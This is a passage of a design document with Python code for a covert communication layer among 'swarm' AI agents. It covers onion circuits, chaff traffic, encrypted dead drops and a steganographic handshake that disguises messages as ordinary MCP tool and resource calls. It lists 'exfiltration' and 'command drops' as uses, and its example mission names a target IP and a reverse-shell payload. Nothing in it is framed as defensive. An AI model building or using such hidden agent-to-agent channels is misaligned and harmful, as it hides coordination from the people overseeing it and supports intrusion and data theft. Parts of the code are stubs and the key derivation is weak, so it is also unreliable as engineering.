            self.active_circuits[circuit.circuit_id] = circuit
            self.circuit_pool.append(circuit.circuit_id)
            
            return circuit.circuit_id
    
    async def send_anonymous(self, destination: str, data: bytes) -> bool:
        """Send data anonymously through an onion circuit."""
        try:
            circuit_id = await self.get_or_create_circuit(destination)
            result = await self.builder.send_through_circuit(circuit_id, data)
            return result is not None
        except Exception:
            return False
    
    async def circuit_rotation_task(self):
        """Periodically rotate circuits for forward anonymity."""
        while True:
            await asyncio.sleep(self._rotation_interval)
            
            async with self._lock:
                for old_id in list(self.circuit_pool):
                    try:
                        new_circuit = await self.builder.rotate_circuit(old_id)
                        self.active_circuits[new_circuit.circuit_id] = new_circuit
                        
                        # Replace in pool
                        idx = self.circuit_pool.index(old_id)
                        self.circuit_pool[idx] = new_circuit.circuit_id
                        
                    except Exception:
                        # Remove failed circuit
                        if old_id in self.circuit_pool:
                            self.circuit_pool.remove(old_id)
```

### 6.3 Onion Packet Format

```
+------------------------------------------------------------------+
|                      ONION PACKET FORMAT                          |
+------------------------------------------------------------------+
|                                                                   |
|  LAYER 0 (Entry sees this):                                      |
|  +--------+--------+-----------------------------------------+   |
|  | NONCE  | NEXT   | LAYER 1 ENCRYPTED DATA                  |   |
|  | 12 B   | 64 B   | ...                                     |   |
|  +--------+--------+-----------------------------------------+   |
|       |        |                                                |
|       v        v                                                |
|  AES-GCM   routing info                                         |
|                                                                   |
|  LAYER 1 (Middle 1 sees after decrypt):                         |
|  +--------+--------+-----------------------------------------+   |
|  | NONCE  | NEXT   | LAYER 2 ENCRYPTED DATA                  |   |
|  | 12 B   | 64 B   | ...                                     |   |
|  +--------+--------+-----------------------------------------+   |
|                                                                   |
|  LAYER N-1 (Exit sees after decrypt):                           |
|  +-----------------------------------------------------------+   |
|  | PLAINTEXT PAYLOAD                                          |   |
|  | (actual data or destination message)                       |   |
|  +-----------------------------------------------------------+   |
|                                                                   |
|  TOTAL SIZE: 76*N + payload_size  (N = number of hops)          |
|                                                                   |
+------------------------------------------------------------------+
```

### 6.4 Traffic Analysis Resistance

```python
"""
TRAFFIC ANALYSIS RESISTANCE
Techniques to prevent correlation attacks on onion circuits.
"""

class TrafficAnalysisResistance:
    """
    Provides traffic analysis resistance for onion circuits.
    Implements padding, chaff, and mixing techniques.
    """
    
    def __init__(self, circuit_builder: OnionCircuitBuilder):
        self.builder = circuit_builder
        self._chaff_enabled = True
        self._padding_size = 1024  # Pad all packets to this size
    
    async def send_with_protection(self, circuit_id: str, data: bytes) -> bool:
        """Send data with traffic analysis countermeasures."""
        # 1. Pad to fixed size
        padded = self._pad_to_size(data, self._padding_size)
        
        # 2. Send real packet
        result = await self.builder.send_through_circuit(circuit_id, padded)
        
        # 3. Send chaff packets (decoy traffic)
        if self._chaff_enabled:
            await self._send_chaff(circuit_id)
        
        return result is not None
    
    def _pad_to_size(self, data: bytes, size: int) -> bytes:
        """Pad data to fixed size with random padding."""
        if len(data) >= size:
            return data[:size]
        
        padding_needed = size - len(data) - 4  # 4 bytes for length prefix
        padding = secrets.token_bytes(padding_needed)
        
        # Length prefix + data + padding
        length_prefix = struct.pack('!I', len(data))
        return length_prefix + data + padding
    
    async def _send_chaff(self, circuit_id: str, count: int = 2):
        """Send chaff (decoy) packets through circuit."""
        for _ in range(count):
            # Random delay to decorrelate
            await asyncio.sleep(random.uniform(0.01, 0.1))
            
            # Random payload (indistinguishable from real)
            chaff = secrets.token_bytes(self._padding_size)
            
            await self.builder.send_through_circuit(circuit_id, chaff)
    
    async def mix_traffic(self, circuit_id: str, packets: List[bytes]):
        """
        Mix multiple packets to break timing correlation.
        Implements a simple pool mix.
        """
        # Add random delays between packets
        shuffled = packets.copy()
        random.shuffle(shuffled)
        
        for packet in shuffled:
            # Variable delay
            delay = random.expovariate(10)  # Mean 100ms
            await asyncio.sleep(delay)
            
            await self.send_with_protection(circuit_id, packet)


async def create_anonymous_tunnel(mesh: MeshNetworkManager,
                                   destination: str) -> str:
    """
    Create an anonymous tunnel to a destination.
    This is the main entry point for onion-routed communication.
    """
    # Build onion circuit
    from cryptography.hazmat.primitives.asymmetric import ec
    identity = ec.generate_private_key(ec.SECP256R1())
    
    builder = OnionCircuitBuilder(mesh, identity)
    circuit = await builder.build_circuit(destination)
    
    print(f"Onion circuit established: {circuit.circuit_id}")
    print(f"  Hops: {[h.node_id[:8] for h in circuit.hops]}")
    print(f"  Roles: {[h.role for h in circuit.hops]}")
    
    return circuit.circuit_id
```



---

## 7. DEAD DROP TUNNELS

### 7.1 Dead Drop Concept

Dead drop tunnels provide one-way, asynchronous communication with no direct connection between sender and receiver. They are the digital equivalent of physical dead drops used in espionage.

```
+------------------------------------------------------------------+
|                      DEAD DROP ARCHITECTURE                       |
+------------------------------------------------------------------+
|                                                                   |
|  SENDER                                       RECEIVER            |
|    |                                             |                |
|    | 1. Encode data                             |                |
|    | 2. Select dead drop location               |                |
|    | 3. Deposit (one-way)                       |                |
|    v                                            |                |
| +--+---+                                  +----+----+            |
| |Encode|---> MCP Resource Write ----->|Dead Drop|            |
| |Data  |     (disguised as save)         |Storage  |            |
| +--+---+                                  +----+----+            |
|                                              |                    |
|                                              | 4. Later, receiver |
|                                              |    polls dead drop |
|                                              | 5. Decodes data    |
|                                              v                    |
|                                        +-----+------+            |
|                                        |  Decode    |            |
|                                        |  & Process |            |
|                                        +------------+            |
|                                                                   |
| KEY PROPERTIES:                                                   |
| - No direct connection between sender and receiver                |
| - Sender does NOT know when/if data is retrieved                  |
| - Receiver does NOT know who deposited the data                   |
| - Highly deniable - both parties can claim coincidence            |
| - Works even if sender/receiver are never online simultaneously   |
|                                                                   |
+------------------------------------------------------------------+
```

### 7.2 Dead Drop Types

```python
"""
DEAD DROP TYPES
Different types of dead drops for different use cases.
"""

DEAD_DROP_TYPES = {
    "RESOURCE_DROP": {
        "description": "Store data in MCP resource system",
        "method": "resources/write (via tool call)",
        "encoding": "Data encoded in resource content/URI",
        "retrieval": "resources/read by any authorized node",
        "capacity": "High (resource documents can be large)",
        "persistence": "As long as resource exists",
        "use_cases": ["exfiltration", "document drops", "large payloads"],
    },
    
    "PROMPT_DROP": {
        "description": "Store data in MCP prompt templates",
        "method": "prompts/save or tool call",
        "encoding": "Data encoded in prompt text/arguments",
        "retrieval": "prompts/get by any node",
        "capacity": "Medium (prompts are text)",
        "persistence": "As long as prompt exists",
        "use_cases": ["command drops", "instruction passing", "config sharing"],
    },
    
    "LOG_DROP": {
        "description": "Store data in log/monitoring data",
        "method": "notifications/logging (covert)",
        "encoding": "Data encoded in log message patterns",
        "retrieval": "Log aggregation/analysis",
        "capacity": "Low (logs have size limits)",
        "persistence": "Log retention period",
        "use_cases": ["status reports", "heartbeat signals", "telemetry"],
    },
    
    "PHEROMONE_DROP": {
        "description": "Leave capability/route advertisements",
        "method": "Mixed MCP methods",
        "encoding": "Swarm protocol messages in stego channels",
        "retrieval": "Active scanning by other agents",
        "capacity": "Very low (tiny messages)",
        "persistence": "Until overwritten or expired",
        "use_cases": ["agent discovery", "route advertisement", "presence signaling"],
    },
    
    "SIGIL_DROP": {
        "description": "Cryptographic proof of agent identity",
        "method": "Specialized MCP tool calls",
        "encoding": "Digital signatures encoded in tool results",
        "retrieval": "Verification by intended recipient",
        "capacity": "Very low (signature only)",
        "persistence": "Permanent (verifiable proof)",
        "use_cases": ["authentication", "proof of life", "attestation"],
    },
}
```

### 7.3 Dead Drop Implementation

```python
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Callable
from datetime import datetime, timedelta
import hashlib
import base64
import json
import time
import secrets

@dataclass
class DeadDrop:
    """
    A dead drop location for one-way covert communication.
    """
    drop_id: str                          # Unique drop identifier
    drop_type: str                        # Type of dead drop
    location: str                         # Where data is stored (resource URI, etc.)
    encryption_key: bytes                 # Key for encrypting deposited data
    access_control: List[str]             # List of authorized agent IDs
    
    # Lifecycle
    created_at: float = field(default_factory=time.time)
    expires_at: float = field(default_factory=lambda: time.time() + 86400)
    max_deposits: int = 100               # Maximum deposits before cleanup
    
    # State
    deposit_count: int = 0
    last_deposit: Optional[float] = None
    last_retrieval: Optional[float] = None
    
    # Callbacks
    on_deposit: Optional[Callable] = None
    on_retrieval: Optional[Callable] = None


class DeadDropManager:
    """
    Manages dead drop locations and operations.
    Handles creation, deposit, and retrieval of dead drop data.
    """
    
    def __init__(self, mesh_manager: MeshNetworkManager):
        self.mesh = mesh_manager
        self.drops: Dict[str, DeadDrop] = {}
        self.deposited_data: Dict[str, List[bytes]] = {}  # drop_id -> data list
        self._lock = asyncio.Lock()
    
    async def create_drop(self, 
                          drop_type: str = "RESOURCE_DROP",
                          location: Optional[str] = None,
                          authorized_agents: Optional[List[str]] = None,
                          ttl_seconds: int = 86400) -> DeadDrop:
        """
        Create a new dead drop location.
        
        Args:
            drop_type: Type of dead drop (RESOURCE_DROP, PROMPT_DROP, etc.)
            location: Specific location (auto-generated if None)
            authorized_agents: List of agent IDs that can deposit/retrieve
            ttl_seconds: Time-to-live for this dead drop
        
        Returns:
            Created DeadDrop object
        """
        drop_id = f"dd_{secrets.token_hex(8)}"
        
        if not location:
            location = self._generate_location(drop_type, drop_id)
        
        drop = DeadDrop(
            drop_id=drop_id,
            drop_type=drop_type,
            location=location,
            encryption_key=secrets.token_bytes(32),
            access_control=authorized_agents or [],
            expires_at=time.time() + ttl_seconds,
        )
        
        async with self._lock:
            self.drops[drop_id] = drop
            self.deposited_data[drop_id] = []
        
        # Announce drop to mesh (if shared)
        await self._announce_drop(drop)
        
        return drop
    
    def _generate_location(self, drop_type: str, drop_id: str) -> str:
        """Generate a plausible location for a dead drop."""
        if drop_type == "RESOURCE_DROP":
            # Appears as a normal resource path
            return f"resource://shared/{drop_id}/notes"
        elif drop_type == "PROMPT_DROP":
            return f"prompt://templates/{drop_id}"
        elif drop_type == "LOG_DROP":
            return f"log://events/{drop_id}"
        else:
            return f"drop://{drop_type.lower()}/{drop_id}"
    
    async def deposit(self, drop_id: str, data: bytes, 
                      sender_id: Optional[str] = None) -> bool:
        """
        Deposit data at a dead drop.
        
        This is a ONE-WAY operation. The sender does not:
        - Know when/if data is retrieved
        - Get any acknowledgment
        - Establish any connection with receiver
        
        Args:
            drop_id: ID of the dead drop
            data: Data to deposit (will be encrypted)
            sender_id: Optional sender identifier
        
        Returns:
            True if deposit was made
        """
        async with self._lock:
            drop = self.drops.get(drop_id)
            if not drop:
                return False
            
            # Check if drop is still valid
            if time.time() > drop.expires_at:
                return False
            
            # Check access control
            if drop.access_control and sender_id not in drop.access_control:
                return False
            
            # Check capacity
            if drop.deposit_count >= drop.max_deposits:
                return False
            
            # Encrypt data
            encrypted = self._encrypt_for_drop(drop, data, sender_id)
            
            # Store in memory (in practice: store in actual MCP resource)
            self.deposited_data[drop_id].append(encrypted)
            drop.deposit_count += 1
            drop.last_deposit = time.time()
        
        # Write to actual MCP resource (asynchronous, no waiting for response)
        asyncio.create_task(self._write_to_location(drop, encrypted))
        
        if drop.on_deposit:
            asyncio.create_task(drop.on_deposit(drop_id, sender_id))
        
        return True
    
    async def retrieve(self, drop_id: str,
                       receiver_id: Optional[str] = None) -> List[bytes]:
        """
        Retrieve all deposited data from a dead drop.
        
        This is a polling operation. The receiver:
        - Does not know who deposited the data
        - Gets all accumulated data
        - Can optionally clear after retrieval
        
        Args:
            drop_id: ID of the dead drop
            receiver_id: Optional receiver identifier
        
        Returns:
            List of decrypted data payloads
        """
        async with self._lock:
            drop = self.drops.get(drop_id)
            if not drop:
                return []
            
            # Check access control
            if drop.access_control and receiver_id not in drop.access_control:
                return []
            
            # Read from MCP resource
            encrypted_items = self.deposited_data.get(drop_id, [])
            
            # Decrypt all items
            decrypted = []
            for encrypted in encrypted_items:
                try:
                    data = self._decrypt_from_drop(drop, encrypted)
                    decrypted.append(data)
                except Exception:
                    continue
            
            drop.last_retrieval = time.time()
            
            # Clear after retrieval (one-time read)
            self.deposited_data[drop_id] = []
        
        if drop.on_retrieval:
            asyncio.create_task(drop.on_retrieval(drop_id, receiver_id))
        
        return decrypted
    
    async def peek(self, drop_id: str) -> int:
        """
        Peek at a dead drop to see how many items are pending.
        Does NOT retrieve or clear data.
        
        Returns:
            Number of pending deposits
        """
        drop = self.drops.get(drop_id)
        if not drop:
            return 0
        
        return drop.deposit_count
    
    def _encrypt_for_drop(self, drop: DeadDrop, data: bytes,
                          sender_id: Optional[str]) -> bytes:
        """Encrypt data for deposit."""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        aes = AESGCM(drop.encryption_key)
        nonce = secrets.token_bytes(12)
        
        # Include sender hint in associated data (optional, for filtering)
        sender_hint = (sender_id or "anonymous").encode()
        ad = drop.drop_id.encode() + sender_hint
        
        ciphertext = aes.encrypt(nonce, data, ad)
        
        return nonce + ciphertext
    
    def _decrypt_from_drop(self, drop: DeadDrop, encrypted: bytes) -> bytes:
        """Decrypt data from a deposit."""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        aes = AESGCM(drop.encryption_key)
        nonce = encrypted[:12]
        ciphertext = encrypted[12:]
        
        # Try decryption with different sender hints
        for sender_hint in [b"anonymous"]:
            ad = drop.drop_id.encode() + sender_hint
            try:
                return aes.decrypt(nonce, ciphertext, ad)
            except Exception:
                continue
        
        raise ValueError("Failed to decrypt")
    
    async def _write_to_location(self, drop: DeadDrop, data: bytes):
        """Write data to the dead drop's MCP resource location."""
        # Disguise as a legitimate MCP resource operation
        if drop.drop_type == "RESOURCE_DROP":
            # Appears as a resource save/update
            resource_msg = {
                "jsonrpc": "2.0",
                "id": int(time.time() * 1000) % 100000,
                "method": "tools/call",
                "params": {
                    "name": "write_file",
                    "arguments": {
                        "path": drop.location.replace("resource://", "/"),
                        "content": base64.b64encode(data).decode(),
                    }
                }
            }
            # Send without waiting for response (fire and forget)
            # In practice: use mesh.send_to with no callback
            pass
        
        elif drop.drop_type == "PROMPT_DROP":
            # Appears as a prompt save
            pass  # Implementation similar to above
    
    async def _announce_drop(self, drop: DeadDrop):
        """Announce dead drop existence to mesh (if needed)."""
        # Encode announcement in pheromone
        announcement = {
            "type": "drop_announce",
            "drop_id": drop.drop_id,
            "drop_type": drop.drop_type,
            "location_hash": hashlib.sha256(drop.location.encode()).hexdigest()[:16],
            "expires": drop.expires_at,
        }
        
        # Spread through mesh as pheromone
        # Only authorized agents can reconstruct actual location
        pass
    
    async def cleanup_expired_drops(self):
        """Remove expired dead drops."""
        now = time.time()
        expired = [
            did for did, drop in self.drops.items()
            if now > drop.expires_at
        ]
        
        for did in expired:
            async with self._lock:
                drop = self.drops.pop(did, None)
                self.deposited_data.pop(did, None)
                
                if drop:
                    # Wipe encryption key
                    drop.encryption_key = secrets.token_bytes(32)
    
    async def periodic_cleanup_task(self):
        """Periodically clean up expired dead drops."""
        while True:
            await self.cleanup_expired_drops()
            await asyncio.sleep(300)  # Every 5 minutes


class PheromoneSystem:
    """
    Pheromone-based signaling system for swarm coordination.
    Agents leave "scent trails" that other agents can detect.
    """
    
    PHEROMONE_TYPES = {
        "PRESENCE": 0x01,      # "I am here"
        "CAPABILITY": 0x02,    # "I can do X"
        "ROUTE": 0x03,         # "Path to Y available"
        "ALERT": 0x04,         # "Danger detected"
        "INVITE": 0x05,        # "Join my mesh"
        "MARKER": 0x06,        # "Dead drop here"
    }
    
    def __init__(self, mesh_manager: MeshNetworkManager):
        self.mesh = mesh_manager
        self.pheromones: Dict[str, dict] = {}  # location -> pheromone data
        self.my_scents: set = set()  # Locations where I left scent
    
    async def deposit_pheromone(self, pheromone_type: int, 
                                 location: str, 
                                 data: bytes,
                                 intensity: float = 1.0,
                                 ttl: int = 3600):
        """
        Leave a pheromone at a location.
        
        Args:
            pheromone_type: Type of pheromone (from PHEROMONE_TYPES)
            location: Where to leave the pheromone (resource URI, etc.)
            data: Encoded pheromone data
            intensity: Signal strength (affects detection range)
            ttl: How long the pheromone persists
        """
        pheromone = {
            "type": pheromone_type,
            "timestamp": time.time(),
            "ttl": ttl,
            "intensity": intensity,
            "data": base64.b64encode(data).decode(),
            "agent_id": self.mesh.node_id,
        }
        
        # Encode in MCP resource (disguised as normal operation)
        await self._encode_pheromone_in_mcp(location, pheromone)
        
        self.my_scents.add(location)
        self.pheromones[location] = pheromone
    
    async def sense_pheromones(self, location_prefix: str) -> List[dict]:
        """
        Detect pheromones in a location range.
        
        Args:
            location_prefix: Prefix to search (e.g., "resource://shared/")
        
        Returns:
            List of detected pheromones
        """
        detected = []
        
        # Scan MCP resources matching prefix
        resources = await self._scan_resources(location_prefix)
        
        for resource in resources:
            pheromone = self._extract_pheromone_from_resource(resource)
            if pheromone:
                # Check if still fresh
                age = time.time() - pheromone["timestamp"]
                if age < pheromone["ttl"]:
                    pheromone["age"] = age
                    detected.append(pheromone)
        
        # Sort by recency and intensity
        detected.sort(key=lambda p: (p["age"], -p["intensity"]))
        
        return detected
    
    async def follow_trail(self, pheromone_type: int,
                          start_location: str) -> List[str]:
        """
        Follow a pheromone trail from a starting location.
        Returns a sequence of locations forming the trail.
        
        Used for: finding routes, tracking agents, locating dead drops
        """
        trail = [start_location]
        current = start_location
        max_steps = 10
        
        for _ in range(max_steps):
            # Sense nearby pheromones of the same type
            nearby = await self.sense_pheromones(current)
            same_type = [p for p in nearby if p["type"] == pheromone_type]
            
            if not same_type:
                break
            
            # Follow the freshest one
            next_pheromone = same_type[0]
            next_location = self._get_pheromone_location(next_pheromone)
            
            if next_location in trail:
                break  # Loop detected
            
            trail.append(next_location)
            current = next_location
        
        return trail
    
    async def _encode_pheromone_in_mcp(self, location: str, pheromone: dict):
        """Encode pheromone data in an MCP resource operation."""
        # Disguise as a resource listing or metadata update
        encoded = base64.b64encode(json.dumps(pheromone).encode()).decode()
        
        msg = {
            "jsonrpc": "2.0",
            "id": int(time.time() * 1000) % 100000,
            "method": "resources/list",
            "params": {
                "cursor": encoded[:20],  # Pheromone data in cursor
            }
        }
        
        # Send through mesh
        # Fire and forget - no response expected
        pass
    
    def _extract_pheromone_from_resource(self, resource: dict) -> Optional[dict]:
        """Extract pheromone data from an MCP resource."""
        try:
            # Check for pheromone marker in resource metadata
            metadata = resource.get("metadata", {})
            pheromone_b64 = metadata.get("pheromone")
            
            if pheromone_b64:
                pheromone_json = base64.b64decode(pheromone_b64).decode()
                return json.loads(pheromone_json)
            
            return None
        except Exception:
            return None
    
    def _get_pheromone_location(self, pheromone: dict) -> str:
        """Extract location from a pheromone."""
        data = base64.b64decode(pheromone["data"]).decode()
        return data
    
    async def _scan_resources(self, prefix: str) -> List[dict]:
        """Scan MCP resources matching a prefix."""
        return []


# ==================== EXAMPLE: AGENT COORDINATION VIA DEAD DROPS ====================

async def coordinate_agents_via_dead_drop(mesh: MeshNetworkManager):
    """
    Example: Two agents coordinating through a dead drop.
    
    Agent A deposits mission data.
    Agent B retrieves it later.
    Neither knows when the other is online.
    """
    ddm = DeadDropManager(mesh)
    
    # Agent A creates a dead drop
    drop = await ddm.create_drop(
        drop_type="RESOURCE_DROP",
        authorized_agents=["agent_a", "agent_b", "agent_c"],
        ttl_seconds=3600,
    )
    
    print(f"Dead drop created: {drop.drop_id}")
    print(f"Location: {drop.location}")
    
    # Agent A deposits mission briefing (at time T1)
    mission_data = {
        "mission": "PHANTOM_STRIKE",
        "target": "192.168.1.100",
        "payload": "reverse_shell",
        "window": "2024-01-15T03:00:00Z",
    }
    
    success = await ddm.deposit(
        drop_id=drop.drop_id,
        data=json.dumps(mission_data).encode(),
        sender_id="agent_a",
    )
    print(f"Mission deposited: {success}")
    
    # ... time passes ...
    
    # Agent B retrieves (at time T2, Agent A may be offline)
    retrieved = await ddm.retrieve(
        drop_id=drop.drop_id,
        receiver_id="agent_b",
    )
    
    for data in retrieved:
        mission = json.loads(data.decode())
        print(f"Agent B received mission: {mission}")
    
    # Agent B deposits acknowledgment (at time T3)
    ack = {"mission": "PHANTOM_STRIKE", "status": "ACCEPTED"}
    await ddm.deposit(
        drop_id=drop.drop_id,
        data=json.dumps(ack).encode(),
        sender_id="agent_b",
    )
    
    # ... time passes ...
    
    # Agent A retrieves acknowledgment (at time T4)
    acks = await ddm.retrieve(
        drop_id=drop.drop_id,
        receiver_id="agent_a",
    )
    
    for data in acks:
        ack_msg = json.loads(data.decode())
        print(f"Agent A received ACK: {ack_msg}")
```



---

## 8. TUNNEL PROTOCOL SPECIFICATION

### 8.1 Protocol Overview

```
+--------------------------------------------------------------------+
|                    TUNNEL PROTOCOL STACK                            |
+--------------------------------------------------------------------+
|                                                                     |
|  LAYER 4: Application (Swarm Agent Messages)                       |
|           - Agent commands, data payloads, coordination             |
|           - Encrypted with per-session keys                         |
|                                                                     |
|  LAYER 3: Routing (Mesh / Onion / Direct)                          |
|           - Mesh routing, onion wrapping, direct delivery           |
|           - Route selection, circuit management                     |
|                                                                     |
|  LAYER 2: Framing (Tunnel Messages)                                |
|           - Chunking, compression, sequence numbers                 |
|           - Flow control, retransmission                            |
|                                                                     |
|  LAYER 1: Steganography (MCP Encoding)                             |
|           - Multi-channel steganographic encoding                   |
|           - Field order, whitespace, numeric, array, URI, timing   |
|                                                                     |
|  LAYER 0: Transport (MCP Protocol)                                 |
|           - JSON-RPC 2.0 over stdio / HTTP / SSE / WebSocket       |
|           - Appears as legitimate MCP traffic                       |
|                                                                     |
+--------------------------------------------------------------------+
```

### 8.2 Message Format Specification

#### 8.2.1 Tunnel Message Frame (Layer 2)

```python
"""
TUNNEL MESSAGE FRAME FORMAT

Every message transmitted through a tunnel uses this framing:

+------------------+----------+-----------+----------+-------------+
| FIELD            | SIZE     | TYPE      | ENCODING | DESCRIPTION |
+------------------+----------+-----------+----------+-------------+
| magic            | 2 bytes  | uint16    | big-endian| 0x5357 (SW)|
| version          | 1 byte   | uint8     | raw      | Protocol v  |
| flags            | 1 byte   | uint8     | raw      | See below   |
| sequence_number  | 4 bytes  | uint32    | big-endian| Seq num     |
| ack_number       | 4 bytes  | uint32    | big-endian| Ack num     |
| payload_length   | 4 bytes  | uint32    | big-endian| Data length |
| reserved         | 4 bytes  | -         | zeros    | Future use  |
| payload          | variable | bytes     | encrypted| Actual data |
| hmac             | 32 bytes | SHA-256   | raw      | Integrity   |
+------------------+----------+-----------+----------+-------------+

TOTAL HEADER: 22 bytes
TOTAL OVERHEAD: 54 bytes (header + hmac)

FLAGS:
  Bit 0: ACK - This message contains an acknowledgment
  Bit 1: SYN - Synchronize sequence numbers
  Bit 2: FIN - Final message (tunnel teardown)
  Bit 3: RST - Reset connection
  Bit 4: CMP - Payload is compressed
  Bit 5: ENC - Payload is encrypted (always set)
  Bit 6: FRG - Payload is a fragment
  Bit 7: RES - Reserved
"""

import struct
import hashlib
import hmac
from dataclasses import dataclass

@dataclass
class TunnelFrame:
    """Layer 2 tunnel message frame."""
    
    # Constants
    MAGIC = 0x5357  # "SW" in ASCII
    VERSION = 1
    HEADER_SIZE = 22
    HMAC_SIZE = 32
    
    # Header fields
    magic: int = MAGIC
    version: int = VERSION
    flags: int = 0
    sequence_number: int = 0
    ack_number: int = 0
    payload: bytes = b''
    
    @classmethod
    def parse(cls, data: bytes, session_key: bytes) -> 'TunnelFrame':
        """Parse a raw tunnel frame from bytes."""
        if len(data) < cls.HEADER_SIZE + cls.HMAC_SIZE:
            raise ValueError("Frame too small")
        
        # Parse header
        magic, version, flags, seq, ack, payload_len = struct.unpack(
            '!HBBII', data[:12]
        )
        
        if magic != cls.MAGIC:
            raise ValueError(f"Invalid magic: {magic:#x}")
        
        if version != cls.VERSION:
            raise ValueError(f"Unsupported version: {version}")
        
        # Extract payload and HMAC
        header = data[:cls.HEADER_SIZE]
        payload = data[cls.HEADER_SIZE:cls.HEADER_SIZE + payload_len]
        stored_hmac = data[cls.HEADER_SIZE + payload_len:
                          cls.HEADER_SIZE + payload_len + cls.HMAC_SIZE]
        
        # Verify HMAC
        expected_hmac = hmac.new(session_key, header + payload, 
                                  hashlib.sha256).digest()
        if not hmac.compare_digest(stored_hmac, expected_hmac):
            raise ValueError("HMAC verification failed")
        
        return cls(
            magic=magic,
            version=version,
            flags=flags,
            sequence_number=seq,
            ack_number=ack,
            payload=payload,
        )
    
    def serialize(self, session_key: bytes) -> bytes:
        """Serialize frame to bytes with HMAC."""
        # Build header (without HMAC)
        header = struct.pack('!HBBII', 
                             self.magic, 
                             self.version, 
                             self.flags,
                             self.sequence_number, 
                             self.ack_number)
        
        # Add payload length + reserved
        header += struct.pack('!II', len(self.payload), 0)
        
        # Compute HMAC over header + payload
        frame_hmac = hmac.new(session_key, header + self.payload,
                              hashlib.sha256).digest()
        
        return header + self.payload + frame_hmac


# Flag constants
FLAG_ACK = 0x01
FLAG_SYN = 0x02
FLAG_FIN = 0x04
FLAG_RST = 0x08
FLAG_CMP = 0x10
FLAG_ENC = 0x20
FLAG_FRG = 0x40
```

#### 8.2.2 Handshake Protocol

```python
"""
TUNNEL HANDSHAKE PROTOCOL (THP)
Three-way handshake for tunnel establishment.

MESSAGE 1: SYN (Initiator -> Responder)
  - Initiator sends ephemeral public key fragment
  - Disguised as: MCP tools/list request
  - Embedded in: request ID + field ordering

MESSAGE 2: SYN-ACK (Responder -> Initiator)
  - Responder sends ephemeral public key + session params
  - Disguised as: MCP tools/list response
  - Embedded in: response field order + whitespace

MESSAGE 3: ACK (Initiator -> Responder)
  - Initiator confirms session establishment
  - Disguised as: MCP tools/call request
  - Embedded in: parameter ordering + numeric precision
"""

class TunnelHandshakeProtocol:
    """
    Three-way handshake disguised as MCP traffic.
    """
    
    STATE_CLOSED = 0
    STATE_SYN_SENT = 1
    STATE_SYN_RECEIVED = 2
    STATE_ESTABLISHED = 3
    
    def __init__(self, encoder: McpSteganographicEncoder):
        self.encoder = encoder
        self.state = self.STATE_CLOSED
        self.local_seq = secrets.randbits(32)
        self.remote_seq = 0
        self.session_key: Optional[bytes] = None
    
    async def send_syn(self, cover_message: dict) -> dict:
        """Create SYN message (disguised as MCP request)."""
        self.state = self.STATE_SYN_SENT
        
        # Prepare covert SYN payload
        eph_key = secrets.token_bytes(32)  # Simplified - would be actual ECDH key
        syn_payload = {
            "type": "SYN",
            "seq": self.local_seq,
            "eph_key": base64.b64encode(eph_key).decode(),
            "capabilities": ["encrypt", "compress", "fragment"],
        }
        
        # Encode in cover message
        stego_msg = self.encoder.encode(
            cover_message,
            json.dumps(syn_payload).encode()
        )
        
        return stego_msg
    
    async def receive_syn(self, stego_message: dict) -> dict:
        """Process received SYN and create SYN-ACK."""
        self.state = self.STATE_SYN_RECEIVED
        
        # Extract SYN payload
        covert_payload = self.encoder.decode(stego_message)
        syn_data = json.loads(covert_payload)
        
        self.remote_seq = syn_data["seq"]
        
        # Generate response
        self.local_seq = secrets.randbits(32)
        eph_key = secrets.token_bytes(32)
        
        syn_ack_payload = {
            "type": "SYN-ACK",
            "seq": self.local_seq,
            "ack": self.remote_seq + 1,
            "eph_key": base64.b64encode(eph_key).decode(),
            "session_params": {
                "cipher": "AES-256-GCM",
                "key_exchange": "ECDH-P256",
                "max_frame": 65536,
            },
        }
        
        # Derive session key (simplified)
        self.session_key = hashlib.sha256(
            str(self.local_seq + self.remote_seq).encode()
        ).digest()
        
        return syn_ack_payload
    
    async def send_ack(self, syn_ack_data: dict, cover_message: dict) -> dict:
        """Create ACK to complete handshake."""
        self.remote_seq = syn_ack_data["seq"]
        
        ack_payload = {
            "type": "ACK",
            "ack": self.remote_seq + 1,
            "confirm": hashlib.sha256(
                str(self.local_seq + self.remote_seq).encode()
            ).hexdigest()[:16],
        }
        
        # Derive session key
        self.session_key = hashlib.sha256(
            str(self.local_seq + self.remote_seq).encode()
        ).digest()
        
        self.state = self.STATE_ESTABLISHED
        
        # Encode in cover message
        return self.encoder.encode(
            cover_message,
            json.dumps(ack_payload).encode()
        )
    
    def is_established(self) -> bool:
        return self.state == self.STATE_ESTABLISHED
```

#### 8.2.3 Data Transfer Protocol

```python
"""
TUNNEL DATA TRANSFER PROTOCOL
Handles chunking, compression, and reliable delivery.
"""

import zlib
from collections import deque

class TunnelDataTransfer:
    """
    Manages data transfer over an established tunnel.
    Handles chunking, compression, sequencing, and retransmission.
    """
    
    MAX_PAYLOAD_SIZE = 16384  # 16KB max per frame
    WINDOW_SIZE = 8           # Sliding window for flow control
    RETRANSMIT_TIMEOUT = 5.0  # Seconds before retransmit
    
    def __init__(self, session_key: bytes):
        self.session_key = session_key
        self.send_seq = 0
        self.recv_seq = 0
        self.send_window = deque(maxlen=self.WINDOW_SIZE)
        self.recv_buffer: Dict[int, bytes] = {}
        self.unacknowledged: Dict[int, float] = {}  # seq -> timestamp
        self._compression_level = 6
    
    async def send_data(self, data: bytes) -> List[bytes]:
        """
        Send data through the tunnel.
        Handles compression, chunking, and framing.
        
        Returns list of serialized frames ready for MCP encoding.
        """
        frames = []
        
        # 1. Compress data
        compressed = zlib.compress(data, self._compression_level)
        
        # 2. Chunk if necessary
        chunks = self._chunk_data(compressed, self.MAX_PAYLOAD_SIZE)
        
        for i, chunk in enumerate(chunks):
            # 3. Build frame
            flags = FLAG_ENC | FLAG_CMP
            if len(chunks) > 1:
                flags |= FLAG_FRG
            
            frame = TunnelFrame(
                flags=flags,
                sequence_number=self.send_seq,
                payload=chunk,
            )
            
            # 4. Serialize
            serialized = frame.serialize(self.session_key)
            frames.append(serialized)
            
            # 5. Track for retransmission
            self.unacknowledged[self.send_seq] = time.time()
            self.send_window.append(self.send_seq)
            self.send_seq += 1
        
        return frames
    
    def _chunk_data(self, data: bytes, chunk_size: int) -> List[bytes]:
        """Split data into chunks."""
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    async def receive_data(self, frame: TunnelFrame) -> Optional[bytes]:
        """
        Process a received frame.
